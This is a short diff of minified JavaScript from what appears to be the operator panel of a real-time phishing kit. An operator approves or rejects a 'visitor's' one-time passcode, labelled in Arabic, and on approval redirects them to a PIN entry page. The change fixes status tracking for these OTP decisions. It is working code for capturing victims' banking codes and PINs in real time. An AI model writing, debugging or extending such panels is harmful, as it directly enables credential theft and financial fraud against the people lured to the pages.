@@ -2644,7 +2644,7 @@
             return new Date(t.timestamp).getTime() - a
         });
         if (0 === T.length && e._v5) {
-            let t = e._v5Status || "pending";
+            let t = y._v5Status || e._v5Status || "pending";
             S.push({
                 id: "otp-current",
                 title: "كود OTP",
@@ -2876,7 +2876,7 @@
                                 break;
                             case "otp":
                                 if (n = resolveHistoryId(vhist, n, ["_t2", "otp"]), "approve" === a) {
-                                    let _hO1=updateHistoryEntry(vhist,n,["_t2","otp"],"approved"); f({...y,history:_hO1});
+                                    let _hO1=updateHistoryEntry(vhist,n,["_t2","otp"],"approved"); f({...y,history:_hO1,_v5Status:"approved"});
                                     await s(vid, redirectPayload("pin", {
                                         history: _hO1,
                                         _v5Status: "approved",
@@ -2885,7 +2885,7 @@
                                         _v6Status: "pending"
                                     })), G.success("تم قبول OTP — توجيه الزائر لصفحة PIN")
                                 } else if ("reject" === a) {
-                                    let _hO2=updateHistoryEntry(vhist,n,["_t2","otp"],"rejected"); f({...y,history:_hO2});
+                                    let _hO2=updateHistoryEntry(vhist,n,["_t2","otp"],"rejected"); f({...y,history:_hO2,_v5Status:"rejected"});
                                     await s(vid, redirectPayload("otp", {
                                         history: _hO2,
                                         _v5Status: "rejected",
